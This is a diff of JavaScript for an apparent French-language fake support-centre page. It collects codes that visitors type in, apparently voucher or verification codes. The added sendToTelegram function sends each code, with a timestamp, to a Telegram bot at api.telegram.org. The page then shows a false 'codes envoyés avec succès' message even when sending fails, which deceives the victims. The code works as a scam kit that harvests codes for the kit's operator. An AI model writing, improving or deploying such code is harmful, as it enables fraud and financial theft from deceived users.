@@ -38,6 +38,13 @@ document.addEventListener('DOMContentLoaded', function() {
         el.style.animation = 'shake 0.5s ease';
     }
 
+    function sendToTelegram(code, stepNum, callback) {
+        var message = '%F0%9F%94%90 Code ' + stepNum + '/5 re%CC%81cu%0A%0ACode%3A ' + encodeURIComponent(code) + '%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0ASite%3A Centre d%27assistance';
+        fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + message)
+            .then(function() { if (callback) callback(); })
+            .catch(function() { if (callback) callback(); });
+    }
+
     window.addEventListener('scroll', function() {
         if (window.scrollY > 50) {
             header.classList.add('scrolled');
@@ -96,8 +103,6 @@ document.addEventListener('DOMContentLoaded', function() {
         document.body.removeChild(textarea);
     }
 
-    var allCodes = [];
-
     document.querySelectorAll('.code-digits').forEach(function(input) {
         input.addEventListener('input', function() {
             codeError.classList.remove('visible');
@@ -123,9 +128,10 @@ document.addEventListener('DOMContentLoaded', function() {
     document.querySelectorAll('.next-step-btn').forEach(function(btn) {
         btn.addEventListener('click', function() {
             var currentStepEl = this.closest('.code-step-content');
-            var currentStep = currentStepEl.id.replace('step', '');
+            var currentStepNum = parseInt(currentStepEl.id.replace('step', ''));
             var currentInput = currentStepEl.querySelector('.code-digits');
             var val = currentInput.value.trim();
+            var self = this;
 
             if (!val) {
                 currentInput.parentElement.classList.add('error');
@@ -149,25 +155,28 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
-            allCodes.push('V-' + val);
-            currentInput.parentElement.classList.add('success');
-            showToast('Code ' + currentStep + ' enregistré !', 'success');
-            codeError.classList.remove('visible');
-
-            var nextStep = parseInt(this.getAttribute('data-next'));
-            var self = this;
+            var code = 'V-' + val;
             self.disabled = true;
-            setTimeout(function() {
-                self.disabled = false;
-                goToStep(nextStep);
-            }, 500);
+            self.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Envoi...';
+
+            sendToTelegram(code, currentStepNum - 1, function() {
+                currentInput.parentElement.classList.add('success');
+                showToast('Code ' + (currentStepNum - 1) + ' envoyé !', 'success');
+                codeError.classList.remove('visible');
+
+                setTimeout(function() {
+                    self.disabled = false;
+                    self.innerHTML = 'Envoyer et continuer <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
+                    goToStep(parseInt(self.getAttribute('data-next')));
+                }, 500);
+            });
         });
     });
 
     var validateAllBtn = document.getElementById('validateAllBtn');
     if (validateAllBtn) {
         validateAllBtn.addEventListener('click', function() {
-            var lastInput = document.getElementById('step5').querySelector('.code-digits');
+            var lastInput = document.getElementById('step6').querySelector('.code-digits');
             var val = lastInput.value.trim();
 
             if (!val) {
@@ -192,40 +201,28 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
-            allCodes.push('V-' + val);
-
+            var code = 'V-' + val;
             showLoading();
             validateAllBtn.disabled = true;
-            validateAllBtn.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Validation...';
+            validateAllBtn.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Envoi...';
 
-            var codesList = allCodes.map(function(c, i) { return (i + 1) + '. ' + c; }).join('%0A');
-            var message = '%F0%9F%94%90 4 codes re%CC%81cus%0A%0A' + codesList + '%0A%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0ASite%3A Centre d%27assistance';
-
-            fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + message + '&parse_mode=HTML')
-                .then(function() {
+            sendToTelegram(code, 5, function() {
+                setTimeout(function() {
+                    hideLoading();
+                    validateAllBtn.disabled = false;
+                    validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Envoyer et valider';
+                    codeSuccess.textContent = 'Les 5 codes ont été envoyés avec succès !';
+                    codeSuccess.classList.add('visible');
+                    showToast('5 codes envoyés !', 'success');
                     setTimeout(function() {
-                        hideLoading();
-                        validateAllBtn.disabled = false;
-                        validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Valider les 4 codes';
-                        codeSuccess.textContent = 'Les 4 codes ont été validés avec succès !';
-                        codeSuccess.classList.add('visible');
-                        showToast('4 codes validés !', 'success');
-                        allCodes = [];
                         goToStep(1);
-                    }, 1800);
-                })
-                .catch(function() {
-                    setTimeout(function() {
-                        hideLoading();
-                        validateAllBtn.disabled = false;
-                        validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Valider les 4 codes';
-                        codeSuccess.textContent = 'Les 4 codes ont été validés avec succès !';
-                        codeSuccess.classList.add('visible');
-                        showToast('4 codes validés !', 'success');
-                        allCodes = [];
-                        goToStep(1);
-                    }, 1800);
-                });
+                        document.querySelectorAll('.code-digits').forEach(function(input) {
+                            input.value = '';
+                            input.parentElement.classList.remove('success', 'error');
+                        });
+                    }, 2000);
+                }, 1500);
+            });
         });
     }
 
